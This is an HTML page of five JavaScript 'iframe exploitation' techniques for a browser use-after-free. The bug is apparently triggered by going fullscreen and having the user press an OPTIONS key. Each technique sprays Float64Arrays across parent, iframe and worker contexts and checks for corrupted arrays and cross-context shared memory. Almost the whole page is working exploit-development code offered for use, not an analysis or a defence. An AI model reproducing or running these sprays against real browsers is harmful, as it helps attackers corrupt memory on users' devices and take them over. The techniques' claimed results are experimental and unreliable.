<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Iframe Techniques</title>
</head>
<body>

<h1>IFRAME EXPLOITATION - 5 TECHNIQUES</h1>

<h2>TECH 1: Parallel UAF in Parent + Iframe</h2>
<button onclick="t1()">RUN</button>
<div id="r1"></div>
<iframe id="if1" style="display:none"></iframe>
<script>
function t1() {
    const r = document.getElementById('r1');
    r.innerHTML = 'Setting up parent + iframe<br>';
    
    const P = 2.121995791e-314;
    
    // Parent arrays
    const parentArrays = [];
    for(let i = 0; i < 3000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        parentArrays.push(a);
    }
    
    r.innerHTML += 'Parent: 3000 arrays<br>';
    
    // Setup iframe
    const iframe = document.getElementById('if1');
    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
    
    iframeDoc.open();
    iframeDoc.write(`
        <script>
        window.iframeArrays = [];
        const P = 2.121995791e-314;
        for(let i = 0; i < 3000; i++) {
            let a = new Float64Array(8);
            a[0] = 10000 + i;
            window.iframeArrays.push(a);
        }
        parent.postMessage('iframe_ready', '*');
        <\/script>
    `);
    iframeDoc.close();
    
    window.addEventListener('message', function handler(e) {
        if(e.data === 'iframe_ready') {
            r.innerHTML += 'Iframe: 3000 arrays<br>';
            r.innerHTML += '<b>Press OPTIONS now</b><br>';
            
            if(document.documentElement.webkitRequestFullscreen) 
                document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                r.innerHTML += 'UAF triggered<br>';
                
                // Spray in BOTH contexts
                const spray = [];
                for(let i = 0; i < 5000; i++) {
                    let s = new Float64Array(10);
                    s.fill(P);
                    spray.push(s);
                }
                
                // Spray in iframe too
                iframe.contentWindow.eval(`
                    const spray = [];
                    const P = 2.121995791e-314;
                    for(let i = 0; i < 5000; i++) {
                        let s = new Float64Array(10);
                        s.fill(P);
                        spray.push(s);
                    }
                `);
                
                r.innerHTML += 'Spray: 5000 parent + 5000 iframe<br>';
                
                // Check parent
                const parentCorrupted = [];
                for(let a of parentArrays) {
                    if(a[0] === P) parentCorrupted.push(a);
                }
                
                // Check iframe
                const iframeArrays = iframe.contentWindow.iframeArrays;
                const iframeCorrupted = [];
                for(let a of iframeArrays) {
                    if(a[0] === P) iframeCorrupted.push(a);
                }
                
                r.innerHTML += '<b>Parent corrupted: ' + parentCorrupted.length + '</b><br>';
                r.innerHTML += '<b>Iframe corrupted: ' + iframeCorrupted.length + '</b><br>';
                
                if(parentCorrupted.length > 0 && iframeCorrupted.length > 0) {
                    r.innerHTML += '<b>BOTH CONTEXTS CORRUPTED!</b><br>';
                    
                    // Test cross-context access
                    parentCorrupted[0][2] = 7.777;
                    
                    r.innerHTML += 'Parent write: 7.777<br>';
                    r.innerHTML += 'Iframe read: ' + iframeCorrupted[0][2] + '<br>';
                    
                    if(iframeCorrupted[0][2] === 7.777) {
                        r.innerHTML += '<b>CROSS-CONTEXT SHARED MEMORY!</b><br>';
                    }
                }
            };
            
            window.removeEventListener('message', handler);
        }
    });
}
</script>

<hr>

<h2>TECH 2: Sequential UAF Triggers</h2>
<button onclick="t2()">RUN</button>
<div id="r2"></div>
<iframe id="if2" style="display:none"></iframe>
<script>
function t2() {
    const r = document.getElementById('r2');
    r.innerHTML = 'Sequential trigger test<br>';
    r.innerHTML += '<b>Press OPTIONS, then press OPTIONS AGAIN</b><br>';
    
    const P = 2.121995791e-314;
    const arrays1 = [];
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays1.push(a);
    }
    
    let triggerCount = 0;
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += '<br>Trigger #' + triggerCount + '<br>';
        
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        const corrupted = [];
        for(let a of arrays1) {
            if(a[0] === P) corrupted.push(a);
        }
        
        r.innerHTML += 'Corrupted: ' + corrupted.length + '<br>';
        
        if(triggerCount === 1 && corrupted.length > 0) {
            r.innerHTML += '<b>First UAF succeeded</b><br>';
            r.innerHTML += '<b>Press OPTIONS AGAIN for second UAF</b><br>';
            
            // Store first corrupted
            window.firstCorrupted = corrupted[0];
        } else if(triggerCount === 2) {
            r.innerHTML += '<b>Second UAF attempt</b><br>';
            
            if(window.firstCorrupted && corrupted.length > 0) {
                r.innerHTML += '<b>Have 2 corrupted from different triggers!</b><br>';
                
                // Test if they share memory
                window.firstCorrupted[3] = 8.888;
                r.innerHTML += 'First[3] = 8.888<br>';
                r.innerHTML += 'Second[3] = ' + corrupted[0][3] + '<br>';
                
                if(corrupted[0][3] === 8.888) {
                    r.innerHTML += '<b>SHARED BETWEEN TRIGGERS!</b><br>';
                }
            }
        }
    };
}
</script>

<hr>

<h2>TECH 3: Iframe Postmessage Data Transfer</h2>
<button onclick="t3()">RUN</button>
<div id="r3"></div>
<iframe id="if3" style="display:none"></iframe>
<script>
function t3() {
    const r = document.getElementById('r3');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const P = 2.121995791e-314;
    const arrays = [];
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        // Try transferring ArrayBuffer to iframe
        const iframe = document.getElementById('if3');
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        
        iframeDoc.open();
        iframeDoc.write(`
            <script>
            window.addEventListener('message', function(e) {
                if(e.data.buffer) {
                    parent.postMessage({
                        result: 'received',
                        byteLength: e.data.buffer.byteLength
                    }, '*');
                    
                    // Try to access
                    try {
                        const view = new DataView(e.data.buffer);
                        const val = view.getUint32(0, true);
                        parent.postMessage({result: 'read', value: val}, '*');
                    } catch(err) {
                        parent.postMessage({result: 'error', msg: err.message}, '*');
                    }
                }
            });
            <\/script>
        `);
        iframeDoc.close();
        
        window.addEventListener('message', function(e) {
            if(e.data.result) {
                r.innerHTML += 'Iframe: ' + e.data.result + '<br>';
                if(e.data.byteLength) r.innerHTML += 'ByteLength: ' + e.data.byteLength + '<br>';
                if(e.data.value) r.innerHTML += 'Value: 0x' + e.data.value.toString(16) + '<br>';
            }
        });
        
        // Send corrupted buffer
        setTimeout(() => {
            try {
                iframe.contentWindow.postMessage({buffer: c.buffer}, '*');
                r.innerHTML += 'Sent buffer to iframe<br>';
            } catch(e) {
                r.innerHTML += 'postMessage error: ' + e.message + '<br>';
            }
        }, 100);
    };
}
</script>

<hr>

<h2>TECH 4: Multiple Iframes Spray</h2>
<button onclick="t4()">RUN</button>
<div id="r4"></div>
<script>
function t4() {
    const r = document.getElementById('r4');
    r.innerHTML = 'Creating 10 iframes<br>';
    
    const P = 2.121995791e-314;
    const iframes = [];
    
    // Create 10 iframes
    for(let i = 0; i < 10; i++) {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        iframeDoc.open();
        iframeDoc.write(`
            <script>
            window.arrays = [];
            const P = 2.121995791e-314;
            for(let i = 0; i < 500; i++) {
                let a = new Float64Array(8);
                a[0] = ${i * 1000} + i;
                window.arrays.push(a);
            }
            <\/script>
        `);
        iframeDoc.close();
        
        iframes.push(iframe);
    }
    
    r.innerHTML += '10 iframes with 500 arrays each<br>';
    
    // Parent arrays
    const parentArrays = [];
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        parentArrays.push(a);
    }
    
    r.innerHTML += 'Parent: 5000 arrays<br>';
    r.innerHTML += '<b>Press OPTIONS</b><br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += 'UAF triggered<br>';
        
        // Massive spray across all contexts
        const spray = [];
        for(let i = 0; i < 3000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        // Spray in each iframe
        for(let iframe of iframes) {
            try {
                iframe.contentWindow.eval(`
                    const spray = [];
                    const P = 2.121995791e-314;
                    for(let i = 0; i < 1000; i++) {
                        let s = new Float64Array(10);
                        s.fill(P);
                        spray.push(s);
                    }
                `);
            } catch(e) {}
        }
        
        r.innerHTML += 'Spray: 3000 parent + 10000 across iframes<br>';
        
        // Check all contexts
        let totalCorrupted = 0;
        const allCorrupted = [];
        
        // Parent
        for(let a of parentArrays) {
            if(a[0] === P) {
                totalCorrupted++;
                allCorrupted.push({context: 'parent', array: a});
            }
        }
        
        // Iframes
        for(let i = 0; i < iframes.length; i++) {
            try {
                const iframeArrays = iframes[i].contentWindow.arrays;
                for(let a of iframeArrays) {
                    if(a[0] === P) {
                        totalCorrupted++;
                        allCorrupted.push({context: 'iframe' + i, array: a});
                    }
                }
            } catch(e) {}
        }
        
        r.innerHTML += '<b>Total corrupted: ' + totalCorrupted + '</b><br>';
        
        if(totalCorrupted >= 2) {
            r.innerHTML += '<b>MULTIPLE CORRUPTION ACHIEVED!</b><br>';
            
            for(let i = 0; i < Math.min(5, allCorrupted.length); i++) {
                r.innerHTML += 'Corrupted #' + i + ': ' + allCorrupted[i].context + '<br>';
            }
            
            // Test shared memory between first two
            if(allCorrupted.length >= 2) {
                allCorrupted[0].array[4] = 1.11111;
                r.innerHTML += '<br>Write to first: 1.11111<br>';
                r.innerHTML += 'Read from second: ' + allCorrupted[1].array[4] + '<br>';
                
                if(allCorrupted[1].array[4] === 1.11111) {
                    r.innerHTML += '<b>CROSS-IFRAME SHARED MEMORY!</b><br>';
                }
            }
        }
    };
}
</script>

<hr>

<h2>TECH 5: Worker + Iframe Combo</h2>
<button onclick="t5()">RUN</button>
<div id="r5"></div>
<iframe id="if5" style="display:none"></iframe>
<script>
function t5() {
    const r = document.getElementById('r5');
    
    if(typeof Worker === 'undefined') {
        r.innerHTML = 'Workers not supported<br>';
        return;
    }
    
    r.innerHTML = 'Setting up Worker + Iframe<br>';
    
    const P = 2.121995791e-314;
    const arrays = [];
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    // Create worker
    const workerCode = `
        self.addEventListener('message', function(e) {
            if(e.data === 'spray') {
                const P = 2.121995791e-314;
                const spray = [];
                for(let i = 0; i < 3000; i++) {
                    let s = new Float64Array(10);
                    s.fill(P);
                    spray.push(s);
                }
                self.postMessage('done');
            }
        });
    `;
    
    try {
        const blob = new Blob([workerCode], {type: 'application/javascript'});
        const workerUrl = URL.createObjectURL(blob);
        const worker = new Worker(workerUrl);
        
        r.innerHTML += 'Worker created<br>';
        
        worker.addEventListener('message', function(e) {
            if(e.data === 'done') {
                r.innerHTML += 'Worker spray complete<br>';
            }
        });
        
        // Setup iframe
        const iframe = document.getElementById('if5');
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        
        iframeDoc.open();
        iframeDoc.write(`
            <script>
            const P = 2.121995791e-314;
            window.arrays = [];
            for(let i = 0; i < 2000; i++) {
                let a = new Float64Array(8);
                a[0] = 20000 + i;
                window.arrays.push(a);
            }
            <\/script>
        `);
        iframeDoc.close();
        
        r.innerHTML += 'Iframe setup complete<br>';
        r.innerHTML += '<b>Press OPTIONS</b><br>';
        
        if(document.documentElement.webkitRequestFullscreen) 
            document.documentElement.webkitRequestFullscreen();
        
        window.onblur = function() {
            r.innerHTML += 'UAF triggered<br>';
            
            // Spray in worker
            worker.postMessage('spray');
            
            // Spray in main
            const spray = [];
            for(let i = 0; i < 3000; i++) {
                let s = new Float64Array(10);
                s.fill(P);
                spray.push(s);
            }
            
            // Spray in iframe
            iframe.contentWindow.eval(`
                const spray = [];
                const P = 2.121995791e-314;
                for(let i = 0; i < 3000; i++) {
                    let s = new Float64Array(10);
                    s.fill(P);
                    spray.push(s);
                }
            `);
            
            r.innerHTML += 'Triple spray: Worker + Main + Iframe<br>';
            
            // Check all
            let corrupted = 0;
            
            for(let a of arrays) {
                if(a[0] === P) corrupted++;
            }
            
            const iframeArrays = iframe.contentWindow.arrays;
            for(let a of iframeArrays) {
                if(a[0] === P) corrupted++;
            }
            
            r.innerHTML += '<b>Total corrupted: ' + corrupted + '</b><br>';
        };
        
    } catch(e) {
        r.innerHTML += 'Worker error: ' + e.message + '<br>';
    }
}
</script>

<p>Execute all 5 iframe techniques</p>

</body>
</html>
